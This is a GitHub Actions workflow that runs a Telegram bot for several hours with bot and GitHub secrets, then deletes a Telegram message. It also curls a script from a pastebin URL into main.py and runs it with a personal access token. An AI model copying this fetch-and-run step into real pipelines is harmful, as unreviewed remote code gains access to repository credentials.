name: two

on:
  repository_dispatch:
    types: [second]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:          
      - uses: actions/checkout@v2
        with:
          repository: ${{ secrets.REPO }}
          token: ${{ secrets.GITHUB }}

      - uses: actions/cache@v2
        with:
          path: ~/.cache/pip
          key: ${{ hashFiles('setup.py') }}-${{ hashFiles('requirements.txt') }}

      - name: Install requirements
        run: pip install --upgrade -r requirements.txt 

      - name: Running Bot
        id: bot
        timeout-minutes: 350
        continue-on-error: true
        run: python -m Manager
        env: 
          EVENT: ${{ github.event.payload }}
          GITHUB: ${{ secrets.GITHUB }}
          APP_ID: ${{ secrets.APP_ID }} 
          API_HASH: ${{ secrets.API_HASH }} 
          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
          HEROKU: ${{ secrets.IS_HEROKU }}
          
      - name: Clone the Python script.
        env:
          TOKEN: ${{ secrets.BOT_TOKEN }}
          CHAT_ID: -1001720148186
        run: |
          curl --location --request GET 'https://api.telegram.org/bot${{env.TOKEN}}/deleteMessage?chat_id=${{env.CHAT_ID}}&message_id=${{steps.bot.outputs.id}}'          
          curl -s https://katb.in/tedunufexog/raw >> main.py

      - name: Run dispatch_event.
        run: |
          echo ${{ env.output }}
          python main.py
        env:
          GITHUB_TOKEN: ${{ secrets.PAT }}
